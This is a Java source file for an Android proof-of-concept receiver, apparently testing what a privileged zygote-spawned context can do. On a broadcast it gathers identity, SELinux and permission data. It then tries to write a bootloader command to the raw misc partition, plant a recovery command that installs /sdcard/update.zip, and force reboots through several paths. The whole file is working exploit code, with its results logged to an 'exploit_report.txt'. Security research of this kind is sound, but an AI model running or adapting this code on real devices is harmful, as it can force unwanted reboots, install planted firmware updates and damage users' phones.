package com.poc;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Process;
import android.os.IBinder;
import android.system.Os;
import android.system.OsConstants;
import android.system.ErrnoException;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileDescriptor;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class Receiver extends BroadcastReceiver {

    private static final String REPORT_PATH = "/cache/exploit_report.txt";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"com.poc.ACTION_START".equals(intent.getAction())) {
            return;
        }
        runExploit();
    }

    private void runExploit() {
        StringBuilder report = new StringBuilder();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault());

        report.append("========================================\n");
        report.append("   Zygote BCB Verification (Pure Java, Os syscalls)\n");
        report.append("   Time: ").append(sdf.format(new Date())).append("\n");
        report.append("========================================\n\n");

        try {
            // --- [1] Basic Identity ---
            int uid = Process.myUid();
            int pid = Process.myPid();
            report.append("UID: ").append(uid).append("\n");
            report.append("PID: ").append(pid).append("\n\n");

            // --- [2] Related Packages (reflection) ---
            Object pm = getPackageManagerService();
            if (pm != null) {
                try {
                    Method getPackagesForUid = pm.getClass().getMethod("getPackagesForUid", int.class);
                    String[] pkgs = (String[]) getPackagesForUid.invoke(pm, uid);
                    report.append("Related Packages: ").append(pkgs != null ? String.join(", ", pkgs) : "None").append("\n\n");
                } catch (Exception e) {
                    report.append("Related Packages: Error - ").append(e.getMessage()).append("\n\n");
                }
            } else {
                report.append("Related Packages: Service not available\n\n");
            }

            // --- [3] SELinux Context ---
            report.append("SELinux Context: ").append(readFile("/proc/self/attr/current")).append("\n\n");

            // --- [4] System Properties ---
            report.append("--- System Properties ---\n");
            report.append("ro.build.version.release: ").append(getProp("ro.build.version.release")).append("\n");
            report.append("ro.build.version.security_patch: ").append(getProp("ro.build.version.security_patch")).append("\n");
            report.append("ro.factorytest: ").append(getProp("ro.factorytest")).append("\n");
            report.append("ro.debuggable: ").append(getProp("ro.debuggable")).append("\n");
            report.append("ro.secure: ").append(getProp("ro.secure")).append("\n\n");

            // --- [5] Filesystem Access (Os syscalls) ---
            report.append("--- Filesystem Access (Os.open/Os.write) ---\n");
            report.append("Write /cache/test_write.tmp: ").append(writeTestOs("/cache/test_write.tmp")).append("\n");
            report.append("Write /data/local/tmp/test_write.tmp: ").append(writeTestOs("/data/local/tmp/test_write.tmp")).append("\n");
            report.append("Execute /system/bin/sh: ").append(canExecute("/system/bin/sh")).append("\n");
            report.append("Execute /data/local/tmp/dummy: ").append(canExecute("/data/local/tmp/dummy")).append("\n\n");

            // --- [6] Permission Checks (reflection) ---
            report.append("--- Runtime Permissions ---\n");
            if (pm != null) {
                String[] perms = {
                    "android.permission.INSTALL_PACKAGES",
                    "android.permission.DELETE_PACKAGES",
                    "android.permission.WRITE_SECURE_SETTINGS",
                    "android.permission.REBOOT",
                    "android.permission.RECOVERY"
                };
                for (String p : perms) {
                    try {
                        Method checkPerm = pm.getClass().getMethod("checkPermission", String.class, String.class, int.class);
                        int res = (int) checkPerm.invoke(pm, p, "com.poc", uid);
                        report.append("checkPermission(").append(p).append("): ").append(res == 0 ? "GRANTED" : "DENIED (" + res + ")").append("\n");
                    } catch (Exception e) {
                        report.append("checkPermission(").append(p).append("): Error\n");
                    }
                }
            }
            report.append("\n");

            // --- [7] BCB Write Verification (using android.system.Os) ---
            report.append("--- BCB Write Verification (Os syscalls) ---\n");

            // 7a. Direct write to misc partition via Os.open/Os.write
            String[] miscPaths = {"/dev/block/by-name/misc", "/dev/block/misc"};
            boolean miscWritten = false;
            for (String path : miscPaths) {
                FileDescriptor fd = null;
                try {
                    fd = Os.open(path, OsConstants.O_RDWR | OsConstants.O_SYNC, 0644);
                    byte[] data = "bootonce-bootloader".getBytes();
                    Os.lseek(fd, 0, OsConstants.SEEK_SET);
                    Os.write(fd, data, 0, data.length);
                    Os.fsync(fd);
                    report.append("Os.write to ").append(path).append(": SUCCESS\n");
                    miscWritten = true;
                    break;
                } catch (ErrnoException e) {
                    report.append("Os.write to ").append(path).append(": ErrnoException (errno=").append(e.errno).append(") - ").append(e.getMessage()).append("\n");
                } catch (Exception e) {
                    report.append("Os.write to ").append(path).append(": EXCEPTION - ").append(e.getMessage()).append("\n");
                } finally {
                    if (fd != null) {
                        try { Os.close(fd); } catch (ErrnoException ignored) {}
                    }
                }
            }
            if (!miscWritten) {
                report.append("Direct write to misc partitions: FAILED (no writable device)\n");
            }

            // 7b. Write /cache/recovery/command
            report.append("Write /cache/recovery/command: ");
            FileDescriptor fd2 = null;
            try {
                fd2 = Os.open("/cache/recovery/command", OsConstants.O_WRONLY | OsConstants.O_CREAT | OsConstants.O_TRUNC, 0644);
                String cmd = "--update_package=/sdcard/update.zip\n--bootonce-bootloader\n";
                Os.write(fd2, cmd.getBytes(), 0, cmd.length());
                Os.fsync(fd2);
                report.append("SUCCESS\n");
            } catch (ErrnoException e) {
                report.append("ErrnoException (errno=").append(e.errno).append(") - ").append(e.getMessage()).append("\n");
            } catch (Exception e) {
                report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
            } finally {
                if (fd2 != null) {
                    try { Os.close(fd2); } catch (ErrnoException ignored) {}
                }
            }

            // 7c. Execute /system/bin/reboot bootloader (java.lang.Process)
            report.append("Execute /system/bin/reboot bootloader: ");
            try {
                java.lang.Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/reboot", "bootloader"});
                int code = p.waitFor();
                report.append(code == 0 ? "SUCCESS (reboot initiated)\n" : "FAILED (exit=" + code + ")\n");
            } catch (Exception e) {
                report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
            }

            // 7d. Set sys.powerctl=reboot,bootloader via SystemProperties (reflection)
            report.append("Set sys.powerctl=reboot,bootloader: ");
            try {
                Class<?> sp = Class.forName("android.os.SystemProperties");
                Method set = sp.getMethod("set", String.class, String.class);
                set.invoke(null, "sys.powerctl", "reboot,bootloader");
                report.append("SUCCESS (attempted)\n");
            } catch (Exception e) {
                report.append("FAILED: ").append(e.getMessage()).append("\n");
            }

            // 7e. IRecoverySystem.setupBcb via reflection
            report.append("IRecoverySystem.setupBcb(\"bootonce-bootloader\"): ");
            Object rec = getService("recovery");
            if (rec != null) {
                try {
                    Method setupBcb = rec.getClass().getMethod("setupBcb", String.class);
                    boolean result = (boolean) setupBcb.invoke(rec, "bootonce-bootloader");
                    report.append(result ? "SUCCESS\n" : "FAILED (returned false)\n");
                } catch (Exception e) {
                    report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
                }
            } else {
                report.append("FAILED (service null)\n");
            }

            // 7f. Os.reboot (reboot syscall) - use raw constant
            report.append("Os.reboot(LINUX_REBOOT_CMD_RESTART=0x1234567): ");
            try {
                // LINUX_REBOOT_MAGIC1=0xfee1dead, MAGIC2=0x28121969 are fixed in Os.reboot
                // We only pass the command: LINUX_REBOOT_CMD_RESTART = 0x1234567
                // Use OsConstants.LINUX_REBOOT_CMD_RESTART if available, else use 0x1234567
                int restartCmd;
                try {
                    // Try to get from OsConstants if available
                    restartCmd = OsConstants.LINUX_REBOOT_CMD_RESTART;
                } catch (Throwable t) {
                    // Fallback to raw constant
                    restartCmd = 0x1234567;
                }
                Os.reboot(restartCmd);
                report.append("SUCCESS (device rebooting!)\n");
            } catch (ErrnoException e) {
                report.append("ErrnoException (errno=").append(e.errno).append(") - ").append(e.getMessage()).append("\n");
            } catch (Exception e) {
                report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
            }

            report.append("\n========================================\n");
            report.append("   End of Report\n");
            report.append("========================================\n");

        } catch (Throwable t) {
            report.append("\n!!! CRITICAL EXCEPTION: ").append(t.toString()).append("\n");
            t.printStackTrace();
        }

        // Save report
        try {
            saveReport(report.toString());
            System.out.println("[+] Report saved to " + REPORT_PATH);
        } catch (IOException e) {
            System.err.println("[-] Failed to save report: " + e.getMessage());
            try {
                new FileWriter("/data/local/tmp/exploit_report.txt").write(report.toString());
                System.out.println("[+] Saved to /data/local/tmp/exploit_report.txt");
            } catch (IOException ex) {
                System.err.println("[-] Could not save report anywhere.");
            }
        }
    }

    // --- Utilities ---

    private void saveReport(String content) throws IOException {
        File reportFile = new File(REPORT_PATH);
        if (!reportFile.getParentFile().exists()) reportFile.getParentFile().mkdirs();
        try (BufferedWriter w = new BufferedWriter(new FileWriter(reportFile))) {
            w.write(content);
        }
        try {
            Runtime.getRuntime().exec(new String[]{"/system/bin/chmod", "0644", REPORT_PATH});
        } catch (Exception ignored) {}
    }

    private String readFile(String path) {
        try {
            return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(path))).trim();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    private String getProp(String key) {
        try {
            return (String) Class.forName("android.os.SystemProperties")
                    .getMethod("get", String.class, String.class)
                    .invoke(null, key, "(null)");
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    private String writeTestOs(String path) {
        FileDescriptor fd = null;
        try {
            fd = Os.open(path, OsConstants.O_WRONLY | OsConstants.O_CREAT | OsConstants.O_TRUNC, 0644);
            Os.write(fd, "test".getBytes(), 0, 4);
            Os.fsync(fd);
            Os.close(fd);
            fd = null;
            new File(path).delete();
            return "SUCCESS (write/delete)";
        } catch (ErrnoException e) {
            return "ErrnoException (errno=" + e.errno + ") - " + e.getMessage();
        } catch (Exception e) {
            return "EXCEPTION: " + e.getMessage();
        } finally {
            if (fd != null) {
                try { Os.close(fd); } catch (ErrnoException ignored) {}
            }
        }
    }

    private String canExecute(String path) {
        File f = new File(path);
        if (f.exists()) {
            return f.canExecute() ? "EXECUTABLE" : "NOT EXECUTABLE";
        } else {
            File p = f.getParentFile();
            if (p != null && p.exists()) {
                return "FILE NOT FOUND, parent exec: " + (p.canExecute() ? "YES" : "NO");
            }
            return "PATH NOT FOUND";
        }
    }

    private Object getService(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method getService = sm.getMethod("getService", String.class);
            IBinder binder = (IBinder) getService.invoke(null, name);
            if (binder == null) return null;
            if ("package".equals(name)) {
                Class<?> stubClass = Class.forName("android.content.pm.IPackageManager$Stub");
                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
                return asInterface.invoke(null, binder);
            } else if ("recovery".equals(name)) {
                Class<?> stubClass = Class.forName("android.os.IRecoverySystem$Stub");
                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
                return asInterface.invoke(null, binder);
            }
            return binder;
        } catch (Exception e) {
            return null;
        }
    }

    private Object getPackageManagerService() {
        return getService("package");
    }
}
